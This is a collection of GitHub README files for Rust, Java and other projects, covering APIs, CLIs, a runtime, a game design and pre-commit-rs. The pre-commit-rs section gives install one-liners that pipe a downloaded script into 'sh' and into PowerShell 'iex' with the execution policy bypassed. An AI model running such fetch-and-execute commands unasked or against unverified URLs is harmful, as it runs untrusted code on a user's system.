    GET /api/projects/{task_column_id}/tasks
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Response:**
    ```json
    [
        {
            ""id"": 1,
            ""name"": ""Task 1"",
            ""description"": ""Description 1"",
            ""taskColumnId"": 1
        },
        ...
    ]
    ```

- **Create a task**
    ```http
    POST /api/projects/{task_column_id}/task
    ```
  **Path Parameters:**
    - `task_column_id`: ID of the task column.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Task 1"",
        ""optionalTaskDescription"": ""Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Task 1"",
        ""description"": ""Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Update a task**
    ```http
    PATCH /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to update.

  **Request Body:**
    ```json
    {
        ""taskName"": ""Updated Task 1"",
        ""optionalTaskDescription"": ""Updated Description 1""
    }
    ```

  **Response:**
    ```json
    {
        ""id"": 1,
        ""name"": ""Updated Task 1"",
        ""description"": ""Updated Description 1"",
        ""taskColumnId"": 1
    }
    ```

- **Delete a task**
    ```http
    DELETE /api/projects/{task_id}/task
    ```
  **Path Parameters:**
    - `task_id`: ID of the task to delete.

  **Response:**
    ```json
    {
        ""answer"": ""Task with id 1 deleted successfully""
    }
    ```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any changes.

## License

This project is licensed under the MIT License.",0,0,2,,,0.0
Gadersd/ic,main,"# A Rust-Based Interaction Combinator Runtime

IC is a runtime inspired by HOC‚Äôs HVM2, that leverages interaction combinators as its computational model. A compiler for UnRust, an untyped language inspired by Rust, is partially implemented.

## What are Interaction Combinators?

Interaction combinators are a model of computation that applies graph rewrite rules to three primary constructs:

- **Eraser** (`*`)
- **Duplicator** (`{}`)
- **Constructor** (`()`)

These combinators operate as the fundamental components of computation, akin to how functions work in traditional models like the lambda calculus. In fact, a subset of the lambda calculus can be translated directly into interaction combinator networks. Most functions used in practice are within this subset.

The key features of interaction combinators include:
- **Beta-optimality:** This means that function applications are performed in the most optimal way possible, avoiding unnecessary computations.
- **Automatic parallelization:** Any algorithm that is inherently parallel can automatically be distributed across multiple cores when run on the interaction combinator runtime, without requiring explicit multithreading constructs.

### Graph Rewriting Rules

The runtime evaluates interaction combinator expressions using graph rewrite rules. For an overview of the syntax used in the language, refer to the following grammar description:

```plaintext
<Node> ::=
    | ""*""                     -- (ERA)ser
    | ""@"" <alphanumeric>       -- (REF)erence
    | <Numeric>                -- (NUM)eric
    | ""("" <Tree> <Tree> "")""    -- (CON)structor
    | ""{"" <Tree> <Tree> ""}""    -- (DUP)licator
    | ""${"" <Tree> <Tree> ""}""   -- (OPE)rator
    | ""?("" <Tree> <Tree> "")""   -- (SWI)tch

<Tree> ::=
    | <alphanumeric>           -- (VAR)iable
    | <Node>

<alphanumeric> ::= [a-zA-Z0-9_./-]+
```
from the HVM2 paper, as described in ""HVM2: A PARALLEL EVALUATOR FOR INTERACTION COMBINATORS"" by Victor Taelin, available at https://github.com/HigherOrderCO/HVM/blob/main/paper/HVM2.pdf.

### Example Usage

To run the project, you'll need **cargo nightly**. Make sure to have Rust's nightly toolchain installed, as it is required to run the current state of the codebase.

```bash
rustup override set nightly
```

Below is a sample interaction combinator program that adds 2 and 3:

```
@main = x & 2 ~ $([+3] x)
```

It may be executed as follows

```plaintext
cargo run
Running `target/debug/ic.exe`
Please enter your code: @main = x & 2 ~ $([+3] x)

Tokens: [Reference, Alphanumeric(""main""), Equal, Alphanumeric(""x""), Ampersand, Alphanumeric(""2""), Redex, Operate, LeftBracket, Operator(Add), Alphanumeric(""3""), RightBracket, Alphanumeric(""x""), RightParenthesis]

Program: Program {
    main: Book {
        name: Alphanumeric { s: ""main"" },
        net: Net {
            tree: Variable(Alphanumeric { s: ""x"" }),
            redexes: [
                Redex {
                    tree_1: Numeric(Number(Number { n: Alphanumeric { s: ""2"" }, native_num: U24(2) })),
                    tree_2: Operate(Operate { a: Numeric(Operation(Operation { op: Add, val: 3 })), b: Variable(Alphanumeric { s: ""x"" }) })
                }
            ]
        },
        others: []
    }
}

Result: Numeric(Number(Number { n: Alphanumeric { s: ""5"" }, native_num: U24(5) }))
```

### Project State

- The core functionality of the interaction combinator runtime is operational, but it needs optimization and refactoring.
- The `UnRust` compiler is still under development and not yet complete.
- I‚Äôve intentionally avoided dependencies beyond the Rust standard library to maximize transparency, making this project highly self-contained.
",0,0,1,MIT,,0.0
schwa/multigit-rs,main,"# Multigit

Multigit is a powerful command-line interface (CLI) tool designed to manage multiple Git repositories simultaneously. It streamlines common Git operations across multiple projects, saving time and effort for developers working with multiple repositories.

**Note: This project is currently in progress and may not work properly. Use at your own risk.**

## Features

- Perform Git operations (status, add, commit, push, pull) on multiple repositories at once
- Execute custom commands across selected repositories
- List and manage registered repositories
- Filter repositories for specific operations
- Open the configured Git UI program for selected repositories
- Easy registration and unregistration of repositories

## Installation

Multigit is a Rust project that can be installed using Cargo, the Rust package manager. Follow these steps to install Multigit:

1. If you don't have Rust and Cargo installed, first install them by following the instructions at [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install).

2. Once Rust and Cargo are installed, you can install Multigit directly from the GitHub repository:

   ```sh
   cargo install --git https://github.com/schwa/multigit-rs
   ```

   This command will download the source code, compile it, and install the `multigit` binary in your Cargo bin directory (usually `~/.cargo/bin/`).

3. Ensure that your Cargo bin directory is in your system's PATH.

Alternatively, if you want to contribute or modify the code:

1. Clone the repository:

   ```sh
   git clone https://github.com/schwa/multigit-rs.git
   cd multigit-rs
   ```

2. Build and install from the local source:

   ```sh
   cargo install --path .
   ```

After installation, you can run `multigit --version` to verify that it's installed correctly.

## Repository Management

### Registering Repositories

To start using Multigit, you first need to register your Git repositories:

```sh
multigit register <PATH>
```

The `<PATH>` can be:

- A direct path to a Git repository
- A path to a directory containing one or more Git repositories

If you provide a directory path, Multigit will recursively search for all Git repositories within that directory and register them.

Example:
```sh
multigit register ~/projects/repo1 ~/projects/repo2 ~/all-projects
```

### Unregistering Repositories

To remove repositories from Multigit's management:

```sh
multigit unregister <PATH>
```

Similar to the register command, `<PATH>` can be a direct path to a Git repository or a directory. If a directory is provided, all registered repositories within that directory will be unregistered.

To unregister all repositories at once:

```sh
multigit unregister --all
```

### Listing Repositories

To confirm whether repositories are registered or to see all managed repositories:

```sh
multigit list
```

This command is useful to verify if a repository was successfully registered or unregistered.

## Common Git Operations

Multigit provides the following commands for managing your repositories:

```sh
multigit [COMMAND] [OPTIONS]
```

### Commands:

- `status`: Show the status of repositories
- `add`: Add files to the staging area in selected repositories
- `commit`: Commit changes in selected repositories
- `push`: Push changes to remote repositories
- `pull`: Pull changes from remote repositories
- `exec`: Execute a custom command in selected repositories
- `ui`: Open the configured Git UI program for selected repositories

### Options:

Most commands support the following option:

- `--filter <FILTER>`: Apply filters to select specific repositories

### Examples:

1. Check status of all repositories:
   ```sh
   multigit status
   ```

2. Check status of dirty repositories:
   ```sh
   multigit status --filter dirty
   ```

3. Commit changes in dirty repositories:
   ```sh
   multigit commit --filter dirty -m ""Update documentation""
   ```

4. Pull changes in dirty repositories:
   ```sh
   multigit pull --filter dirty
   ```

5. Execute a custom command in dirty repositories:
   ```sh
   multigit exec --filter dirty -- git log --oneline -n 5
   ```

## Configuration

Multigit can be configured by editing the TOML file located at `~/.config/multigit/config.toml`.

[Add more details about configuration options and their effects]

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License.

## Author

Jonathan Wight

## Version

0.1

For more detailed information on each command and its options, use the `--help` flag:

```sh
multigit --help
multigit [COMMAND] --help
```
",1,0,2,,rust.yml,0.0
WhiteSponge/rust_dashboard_app,main,"<picture>
    <source srcset=""https://raw.githubusercontent.com/leptos-rs/leptos/main/docs/logos/Leptos_logo_Solid_White.svg"" media=""(prefers-color-scheme: dark)"">
    <img src=""https://raw.githubusercontent.com/leptos-rs/leptos/main/docs/logos/Leptos_logo_RGB.svg"" alt=""Leptos Logo"">
</picture>

# Leptos Starter Template

This is a template for use with the [Leptos](https://github.com/leptos-rs/leptos) web framework and the [cargo-leptos](https://github.com/akesson/cargo-leptos) tool.

## Creating your template repo

If you don't have `cargo-leptos` installed you can install it with

`cargo install cargo-leptos --locked`

Then run

`cargo leptos new --git leptos-rs/start`

to generate a new project template (you will be prompted to enter a project name).

`cd {projectname}`

to go to your newly created project.

Of course, you should explore around the project structure, but the best place to start with your application code is in `src/app.rs`.

## Running your project

`cargo leptos watch`  
By default, you can access your local project at `http://localhost:3000`

## Installing Additional Tools

By default, `cargo-leptos` uses `nightly` Rust, `cargo-generate`, and `sass`. If you run into any trouble, you may need to install one or more of these tools.

1. `rustup toolchain install nightly --allow-downgrade` - make sure you have Rust nightly
2. `rustup target add wasm32-unknown-unknown` - add the ability to compile Rust to WebAssembly
3. `cargo install cargo-generate` - install `cargo-generate` binary (should be installed automatically in future)
4. `npm install -g sass` - install `dart-sass` (should be optional in future)

## Executing a Server on a Remote Machine Without the Toolchain
After running a `cargo leptos build --release` the minimum files needed are:

1. The server binary located in `target/server/release`
2. The `site` directory and all files within located in `target/site`

Copy these files to your remote server. The directory structure should be:
```text
leptos_start
site/
```
Set the following environment variables (updating for your project as needed):
```sh
export LEPTOS_OUTPUT_NAME=""leptos_start""
export LEPTOS_SITE_ROOT=""site""
export LEPTOS_SITE_PKG_DIR=""pkg""
export LEPTOS_SITE_ADDR=""127.0.0.1:3000""
export LEPTOS_RELOAD_PORT=""3001""
```
Finally, run the server binary.

## Notes about CSR and Trunk:
Although it is not recommended, you can also run your project without server integration using the feature `csr` and `trunk serve`:

`trunk serve --open --features csr`

This may be useful for integrating external tools which require a static site, e.g. `tauri`.

## Licensing

This template itself is released under the Unlicense. You should replace the LICENSE for your own application with an appropriate license if you plan to release it publicly.
",0,0,1,Unlicense,,2.0
beowolx/fast_1brc,main,"# Fast 1BRC

## Overview

This is my solution to [The One Billion Row Challenge](https://github.com/gunnarmorling/1brc) which consists of processing a file with one billion rows.
Each row consists of a weather station name and a temperature reading. The goal is to compute the minimum, mean, and maximum temperatures for each weather station and output the results in an alphabetically ordered format.

## Performance

| **Platform**                        | **User Time** | **System Time** | **CPU Usage** | **Total Time** |
| ----------------------------------- | ------------- | --------------- | ------------- | -------------- |
| MacBook PRO, M1 Pro 2021, 32 GB RAM | 0.07s         | 3.49s           | 308%          | 1.155s         |
| MacBook PRO, M1 Pro 2020, 16 GB RAM | 0.04s         | 3.20s           | 39%           | 8.187s         |

## Flamegraph

![Flamegraph](flamegraph.svg)

## Getting Started

### 1. Generate the Dataset

To create the required dataset for the challenge, execute the following command:

```bash
cargo run --release --package generate-dataset 1000000000
```

- **Description:** Compiles and runs the `generate-dataset` package in release mode, generating a `measurements.txt` file containing **1,000,000,000** temperature records.
- **Output Format:**
  ```
  Hamburg;12.0
  Bulawayo;8.9
  Palembang;38.8
  Hamburg;34.2
  St. John's;15.2
  Cracow;12.6
  ... etc. ...
  ```

### 2. Run the Processor

After generating the dataset, build and execute the temperature processor using the following command:

```bash
cargo build --release && time target/release/fast_1brc
```

## Technical Implementation

### 1. Chunk-Based File Reading

- **Chunk Size:** The input file `measurements.txt` is partitioned into **16 MB** chunks (`CHUNK_SIZE = 16 * 1024 * 1024`).
- **Chunk Overlap:** To handle lines that span across chunks, each chunk includes an overlap of **64 bytes** (`CHUNK_OVERLAP = 64`).
- **File Access:** Utilizes `FileExt::read_at` for concurrent, thread-safe reads of specific file segments, enabling parallel processing without seeking conflicts.

### 2. Parallel Processing with Crossbeam

- **Thread Management:** Employs the `crossbeam` crate to create scoped threads, dynamically matching the number of available CPU cores (`num_cpus::get()`).
- **Work Distribution:** An `AtomicU64` (`offset`) manages the distribution of file read offsets, ensuring each thread processes a unique file segment without overlap, except for the intentional `CHUNK_OVERLAP`.

### 3. SIMD Optimization for Newline Detection

- **SIMD Utilization:** Implements Rust's SIMD capabilities via the `std::simd` module to accelerate the detection of newline characters (`\n`).
- **Functionality:** The `find_next_newline_simd` function processes the buffer in 64-byte SIMD vectors, performing parallel comparisons to locate newline characters efficiently. If no newline is found within the SIMD-processed block, it falls back to scalar byte-by-byte scanning for the remaining data.

  ```rust
  fn find_next_newline_simd(buffer: &[u8]) -> Option<usize> {
      let mut index = 0;
      let simd_size = 64;

      while index + simd_size <= buffer.len() {
          let bytes = Simd::<u8, 64>::from_slice(&buffer[index..index + simd_size]);
          let mask = bytes.simd_eq(Simd::splat(b'\n'));
          let bits = mask.to_bitmask();

          if bits != 0 {
              let pos = bits.trailing_zeros() as usize;
              return Some(index + pos);
          }

          index += simd_size;
      }

      for i in index..buffer.len() {
          if buffer[i] == b'\n' {
              return Some(i);
          }
      }

      None
  }
  ```

### 4. Parsing and Aggregation

- **Temperature Parsing:** Utilizes the `fast_float` crate to convert temperature byte slices to `f64` values rapidly through the `parse_temp` function.

  ```rust
  fn parse_temp(bytes: &[u8]) -> Option<f64> {
      fast_parse_float(bytes).ok()
  }
  ```

- **Chunk Processing:** The `process_chunk` function iterates through each line within a chunk, parsing the station name and temperature, and aggregates the data using a local `FxHashMap`.

  ```rust
  fn process_chunk<'a>(chunk: &'a [u8]) -> fxhash::FxHashMap<&'a [u8], Records> {
      let mut map: fxhash::FxHashMap<&'a [u8], Records> = fxhash::FxHashMap::default();

      let mut start = 0;
      let len = chunk.len();

      while start < len {
          let end = match find_next_newline_simd(&chunk[start..]) {
              Some(pos) => start + pos,
              None => len,
          };

          let line = &chunk[start..end];
          if let Some(pos) = memchr::memchr(b';', line) {
              let station = &line[..pos];
              let temp_bytes = &line[pos + 1..];

              if let Some(temp) = parse_temp(temp_bytes) {
                  map.entry(station)
                      .and_modify(|e| e.update(temp))
                      .or_insert_with(|| Records::new(temp));
              }
          }

          start = end + 1;
      }

      map
  }
  ```

### 5. Concurrent Data Aggregation

- **Global Aggregation Map:** An `Arc<Mutex<HashMap<String, Records, FxBuildHasher>>>` serves as the thread-safe global hash map for aggregating results from all threads.

  ```rust
  let global_map = Arc::new(Mutex::new(HashMap::with_hasher(FxBuildHasher::default())));
  ```

- **Merging Local Maps:** Each thread maintains a local `FxHashMap` during chunk processing. After processing, the local map is merged into the global map within a mutex-protected block to ensure thread safety.

  ```rust
  let mut global_map = global_map.lock().unwrap();
  for (station_bytes, records) in local_map {
      let station = String::from_utf8_lossy(station_bytes).to_string();
      global_map
          .entry(station)
          .and_modify(|e: &mut Records| e.merge(&records))
          .or_insert(records);
  }
  ```

### 6. Memory Allocation with Jemalloc

- **Allocator Configuration:** Integrates `tikv_jemallocator` as the global memory allocator to optimize allocation patterns, particularly beneficial for the high-throughput, multi-threaded nature of the application.

  ```rust
  #[cfg(not(target_env = ""msvc""))]
  use tikv_jemallocator::Jemalloc;

  #[cfg(not(target_env = ""msvc""))]
  #[global_allocator]
  static GLOBAL: Jemalloc = Jemalloc;
  ```

### 7. Processing Workflow

1. **File Initialization:** Opens `measurements.txt` and retrieves its size to determine the total number of chunks.
2. **Thread Spawning:** Creates threads equal to the number of CPU cores available.
3. **Chunk Reading:** Each thread reads assigned chunks with overlap handling to ensure complete line reads.
4. **Line Parsing:** Utilizes SIMD-optimized newline detection to identify and parse each line within the chunk.
5. **Data Aggregation:** Updates local `FxHashMap` instances with temperature statistics for each station.
6. **Global Aggregation:** Merges local maps into the global hash map under mutex protection.
7. **Result Compilation:** After all chunks are processed, the program sorts station names alphabetically and outputs the aggregated statistics.
",0,0,1,,,0.0
apostoli-karpouzis/Fishing-Game,main,"# Fishing Game!

by fishing game

## Team Members
* Advanced Topic Subteam 1: Physics/Fluid Dynamics
	* Cole Metrick
	* Ken Barrett
	* Jason Ye
	* Dheyab Alshehhi

* Advanced Topic Subteam 2: Bayesian Networks
	* Ben Gradeck
	* Jackie Colmenares
	* Apostoli Karpouzis
	* Corey Medve


## Game Description

We are making a top-down fishing and exploration game. The player will explore the game world looking for new bodies of water to catch fish in. Along the way players will obtain new equiptment, sell their catches for money, and work towards catching the biggest fish they can. The gameplay will have two main advanced topics to give some realism to the fishing. Fluid dynamics will simulate casting the bait, using the lure, then dragging the fish in. It will simulate realistic fluic dynamics to give an accurate simulation of fishing. Once a fish is on the line the player will have to sucessfully reel a fish in without the fish snapping the line. The other advanced topic is sophisticated fish AI. There will be a determined number of fish in each water source. The fish in the game will all behave differently depending on species, ex: catfish staying exclusivly at the bottom, or trout only fishing against a streams current. New fish will spawn on a cycle to simulate fish reaching maturity or dying in order to simulate a target population. Enviornmental aspects and lure use will simulate catching fish, better lure use or casting into an ideal location will influence the fish to get hooked more often. 

### Concept Art:
![Artwork](assets/art/art1.png)
![Artwork](assets/art/art2.png)
![Artwork](assets/art/art3.png)
![Artwork](assets/art/art4.png)


## Advanced Topic Description

### Advanced Physics/Fluid Dynamics

We will create an accurate 3D simulation of different bodies of water. There will be waves that are dispered when surface tension is broken and different lures will act differently in the water. The translational and rotational motion of the fish will be calculated based on player actions, fish characteristics, and fishing rod characteristics. Fluid-dynamic drag will factor into the motion. Projectile motion will be incorpoated for lure casting based on the lure weight and rod strength. The tensile strength of the fishing rod and line will be taken into account for visuals and line snapping. For example, the rod will bend more when there is more tension on the line. Environmental factors like water currents and debris will affect tension on the line and increase drag.

### Bayesian Networks (AI)

Our goal with AI is to simulate the existence of how many fish are in the pond, and what types of fish they are, as well as their behavior. We will develop a behavior tree to model the variety of actions for each fish species. The fish behavior will be dependant on how close the lures are, and what kind of bait is in the water, as well as environmental conditions. These fish actions will be passed on to the fluid dynamics team. Depending on how the fish is moving, slowly or quickly, towards or away from the lure, will affect the water movement. The fish behavior will be calculated per frame, and the existance of those fish will be evaluated in a larger scope of the game world. 


## Midterm Goals

### General
* 4x4 grid will be out game world each segment about one screen size (similar to NES Zelda)
* 1 lure type
* 2D top down player movement for overworld exploration
* Small collection of fish types with basic behavior. At least 2 with probability models.
* Shop system for buying lures and selling off fish
* Simple functional animation to convey gameplay ideas ex: walking, casting, reel moving, fish animations when its moving.
* Basic UI for water physics. for example a lure/fish making water ripple as they move through the water.


### Physics
* Implement 3D simulation of water. 
  * Waves will disperse when surface tension is broken
    * When bait is casted into water
    * When reeling in bait
* We will implement projectile calculation to determine casting distance of lure.

### Bayesian Networks
* Create one fishing environment
  * Defined model for introduction and removal of fish into environment
  * Incorporate time of day and weather into environment's model/fish spawn probability
* Create two different fish types
  * Bayesian network for activity of the fish types
  * Take time of day, water depth, and weather into account for Bayesian networks (with fixed values for each)


## Final Goals

### General (40%)
* Multiple line types (braided, monofilament) (10%)
* 3 different lure types (10%)
* 5x5 game world grid (10%)
* Multiple ponds/lakes that have a chance of spawning different fish (5%)
* In-water elements affecting spawning such as lily pads in ponds or rocks in water¬†(5%)


### Physics (20%)
* Fishing rod (8%)
  * Line breaking when too much tension is reached
  * Rod bending based on amount of tension on line
* Calculate fish drag force based on motion and characteristic of fish (8%)
  * Physical characteristics
    * Mass
    * Size
    * Shape
  * Motion
    * Velocity
    * Rotation
* Different lures will act differently in water (4%)
    * Heavier lures will sink and take longer to reel in due to water viscosity 
    * Surface lures will float and create more waves when reeling


### Bayesian Networks (20%)
* 1 fishing enviroment (5%)
  * Fishing enviroments attempt to maintain a population of fish with fish being added/removed each day 
* 5 different types of fish each with its own behavioral tree(5%)
* Implementation of day/night cycle (5%)
  * Look/lighting in the world changes based off of the time of day
  * The fish able to be caught and the activity of the enviroments differ on the time of day
* Implement weather cycle (5%)
  * Different regions of the map can have different weather at the same time
  * Weather can change throughout the day


## Stretch Goals (10%)

* Add 2 items that enhances the players ability to catch a fish (3%)
  * A pair of polarized glasses to improve the odds of finding fish
  * A new rod to change how the players interacts with the physics
* Add a legendary rarity fish (3%)
  * Much harder to catch and spawns less often than the other fish types
* Debris (2%)
  * Increases drag when debris is caught
* Wild lures/items to find (2%)
  * Makes exploration rewarding by hiding collectable items/better lures in the game world 
",0,0,6,MIT,,133.0
graalvm/graal-languages-demos,main,"# Graal Languages - Demos and Guides

This repository contains demo applications and guides for [GraalJS](./graaljs), [GraalPy](./graalpy/), [GraalWasm](./graalwasm), and other Graal Languages.
Each demo and guide includes a _README.md_ that explains how to run the application and how it works in more detail.

## Help

If you need help with any of the demos or guides, please [file a GitHub issue](https://github.com/graalvm/graal-languages-demos/issues/new).

## Contributing

This project welcomes contributions from the community. Before submitting a pull request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security vulnerability disclosure process.

## License

Copyright (c) 2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.
",0,0,3,UPL-1.0,"graaljs-maven-webpack-guide.yml,graaljs-starter.yml,graalpy-check-snippets.yml,graalpy-custom-venv-guide.yml,graalpy-freeze-dependencies-guide.yml,graalpy-javase-guide.yml,graalpy-jbang-qrcode.yml,graalpy-jython-guide.yml,graalpy-micronaut-guide.yml,graalpy-micronaut-pygal-charts.yml,graalpy-native-extensions-guide.yml,graalpy-openai-starter.yml,graalpy-spring-boot-guide.yml,graalpy-spring-boot-pygal-charts.yml,graalpy-starter.yml,graalwasm-embed-c-code-guide.yml,graalwasm-micronaut-photon.yml,graalwasm-spring-boot-photon.yml,graalwasm-starter.yml",13.0
vortelus/ref-contracts,main,"# Ref Finance Contracts

This mono repo contains the source code for the smart contracts of Ref Finance

## Development

1. Install `rustup` via https://rustup.rs/
2. Run the following:

```
rustup default stable
rustup target add wasm32-unknown-unknown
```

### Testing

Contracts have unit tests and also integration tests using NEAR Simulation framework. All together can be run:

```
cd ref-exchange
cargo test --all
```

### Compiling

You can build release version by running next scripts inside each contract folder:

```
cd ref-exchange
./build.sh
```

### Deploying to TestNet

To deploy to TestNet, you can use next command:
```
near dev-deploy
```

This will output on the contract ID it deployed.
",0,0,5,MIT,,4.0
Zacholme7/NodeDB,main,"# NodeDB
NodeDB is a revm DB implementation that hooks directly into the reth database and operates on the latest canonical state. The advantages of this are very obvious. Fetching from the db is **very** fast and should be used instead of RPC/IPC when possible. 

Current baked in revm DB implementations cache state without fetching from provider (CacheDB), fetch state from provider but dont dont allow you to insert accounts/storage (AlloyDB), or fetch state and cache it which results in old state (CacheDB(AlloyDB)). 

# Usage
```rust
use node_db::NodeDB;

let nodedb = NodeDB::new(""path/to/your/data"")?;

//...use as you would any other db
```

# Use Case/Inspiration
I have a custom quoter contract for my arbitrage bot which I use for simulations. I needed a DB that would allow me to insert the contract code and other state information while also being able to operate on the most up to date chain state for proper quotes. NodeDB allows me to insert and execute against arbitraty contract code while also being able to insert storage data for things such as token balances, approvals, etc. 

# Problems

We have no way to know before hand if an account/storage has been updated. The only way is to fetch the account when it is needed and then compare it to the cached value. If we are fetching, we might as well just insert it anyways. On the other hand, we know that custom contracts/accounts that we have inserted will only be modifed within the evm instance as it has no chain state. 

You could implement functionality to pass in list of updated accounts that can be marked as out of date, or you could modify the `update_provider` function to process blocks and determine touched state.

This is not the prettiest implementation and im sure there are uncaught edge cases, but it works for what I need to accomplish. Please fork/submit pull req if you you make any positive upgrades! 
",0,0,1,,,0.0
hamzalamin/ITLens,main,"# Survey IT API Overview

**Survey IT** is a RESTful application built with **Spring Boot** that facilitates the creation, management, and participation in IT-focused surveys. The platform, **ITLens**, enables users to engage with structured surveys and view detailed statistical results of responses.


## üöÄ Features

- **Survey Management**: Create and manage surveys with hierarchical structures (Chapters ‚Üí Sub-Chapters ‚Üí Questions).
- **Question Types**: 
  - üìã **Single Choice Questions** 
  - üìù **Multiple Choice Questions**
- **Survey Participation**: Collect user responses for active surveys.
- **Results Analysis**: View statistical insights and percentage breakdowns of survey responses.

## üõ†Ô∏è Technical Stack

- **Backend**: Spring Boot, Spring Web (REST API), Spring Data JPA, Spring Validation, Spring Context
- **Database**: PostgreSQL
- **Documentation**: Swagger/OpenAPI
- **Testing**: JUnit 5, Mockito
- **Utilities**: Lombok, MapStruct (DTO Mapping), @RestControllerAdvice (Centralized Exception Handling)

## üß≥ Data Model

### Core Entities
#### **Survey**  
- `id`: Integer  
- `title`: String  
- `description`: String  
- `owner`: Owner (reference)

#### **SurveyEdition**  
- `id`: Integer  
- `creationDate`: Date  
- `startDate`: Date  
- `year`: Integer  
- `survey`: Survey (reference)

#### **Subject/Chapter**  
- `id`: Integer  
- `title`: String

#### **SubSubject/SubChapter**  
- `id`: Integer  
- `title`: String  
- `subject`: Subject (reference)

#### **Question**  
- `id`: Integer  
- `text`: String  
- `answerCount`: Integer  
- `type`: QuestionType (SINGLE_CHOICE, MULTIPLE_CHOICE)  
- `subSubject`: SubSubject (reference)

#### **Answer**  
- `id`: Integer  
- `text`: String  
- `selectionCount`: Integer  
- `question`: Question (reference)

#### **Owner**  
- `id`: Integer  
- `name`: String

# üí° Custom @Exist Annotation

The `@Exist` annotation is a custom validation annotation created to check whether a given entity exists in the database. This is particularly useful for validating foreign key relationships and ensuring data integrity before saving.

### Usage:
Simply annotate your DTO fields with `@Exist` to ensure that the related entity exists in the database.

Example:
```java
@NotNull @Positive @Exist(entity = Owner.class) Long ownerId
```

## üìÅ Project Structure

```plaintext
src/
‚îú‚îÄ‚îÄ main/
‚îÇ   ‚îú‚îÄ‚îÄ java/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ com.wora.itlens/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ annotations/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ config/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ controllers/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ exceptions/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ mappers/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ models/
‚îÇ   ‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ dtos/
‚îÇ   ‚îÇ       ‚îÇ   ‚îú‚îÄ‚îÄ entites/
‚îÇ   ‚îÇ       ‚îÇ   ‚îî‚îÄ‚îÄ enumes/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ repositories/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ validation/
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ ItLensApplication.java
‚îÇ   ‚îî‚îÄ‚îÄ resources/
‚îÇ       ‚îú‚îÄ‚îÄ static/
‚îÇ       ‚îú‚îÄ‚îÄ templates/
‚îÇ       ‚îú‚îÄ‚îÄ application.properties
‚îÇ       ‚îî‚îÄ‚îÄ application-test.properties
‚îî‚îÄ‚îÄ test/
    ‚îî‚îÄ‚îÄ java/
        ‚îî‚îÄ‚îÄ com.wora.itlens/

```
# üöÄ How to Get Started

### Prerequisites
Before running the application, make sure you have the following installed:
Java 17+
Maven
PostgreSQL database

### Setup Instructions
Clone the repository:
```plaintext
git clone https://github.com/hamzalamin/itLens/
```

Install the dependencies:
```plaintext
mvn install
```

Configure your database credentials:
```plaintext
spring.datasource.url=jdbc:postgresql://localhost:5432/your_database_name
spring.datasource.username=your_database_username
spring.datasource.password=your_database_password
```

# üåê API Documentation:
You can explore the API documentation using Swagger at:
http://localhost:8080/swagger-ui.html

# üìê Class Diagram:
![Class Diagram](https://github.com/hamzalamin/ITLens/blob/main/src/main/java/com/wora/itlens/classesDiagramme/classes.png)



",0,0,16,,,1.0
j178/pre-commit-rs,master,"# pre-commit-rs

![Development Status](https://img.shields.io/badge/Development-Early_Stage-yellowgreen)
[![CI](https://github.com/j178/pre-commit-rs/actions/workflows/ci.yml/badge.svg)](https://github.com/j178/pre-commit-rs/actions/workflows/ci.yml)

A reimplementation of the [pre-commit](https://pre-commit.com/) tool in Rust, providing a faster and dependency-free alternative.
It aims to be a drop-in replacement for the original tool while also providing some more advanced features.

> [!WARNING]
> This project is still in very early development, only a few of the original pre-commit features are implemented.
> It is not recommended for normal use yet, but feel free to try it out and provide feedback.

## Features

- A single binary with no dependencies, does not require Python or any other runtime.
- Improved performance in hook preparation and execution.
- Fully compatible with the original pre-commit configurations and hooks.
- (TODO) Built-in support for monorepos.
- (TODO) Built-in implementation of some common hooks.
- (TODO) Integration with [`uv`](https://github.com/astral-sh/uv) for managing Python tools and environments.

## Installation

### Standalone installer

`pre-commit-rs` provides a standalone installer script to download and install the tool:

```console
# On Linux and macOS
curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/pre-commit-rs/releases/download/v0.0.5/pre-commit-rs-installer.sh | sh

# On Windows
powershell -ExecutionPolicy ByPass -c ""irm https://github.com/j178/pre-commit-rs/releases/download/v0.0.5/pre-commit-rs-installer.ps1 | iex""
```

### PyPI

`pre-commit-rs` is published as Python binary wheel to PyPI under the name `pre-commit-rusty`,
you can install it using `pip`, `uv` (recommended), or `pipx`:

```console
pip install pre-commit-rusty

# or

uv tool install pre-commit-rusty

# or

pipx install pre-commit-rusty
```

### Homebrew

```console
brew install j178/tap/pre-commit-rs
```

### Cargo

Build from source using Cargo:

```console
cargo install --locked pre-commit-rs
```

Install from the binary directly using `cargo binstall`:

```console
cargo binstall pre-commit-rs
```

### GitHub Releases

`pre-commit-rs` release artifacts can be downloaded directly from the [GitHub releases](https://github.com/j178/pre-commit-rs/releases).

## Usage

> [!NOTE]
> The binary executable is named `pre-commit` (or `pre-commit.exe` on Windows) - without the `-rs` suffix. It should be available in your `PATH` after installation.

This tool is designed to be a drop-in replacement for the original pre-commit tool, so you can use it with your existing configurations and hooks.

Please refer to the [official documentation](https://pre-commit.com/) for more information on how to configure and use pre-commit.

## Acknowledgements

This project is heavily inspired by the original [pre-commit](https://pre-commit.com/) tool, and it wouldn't be possible without the hard work
of the maintainers and contributors of that project.

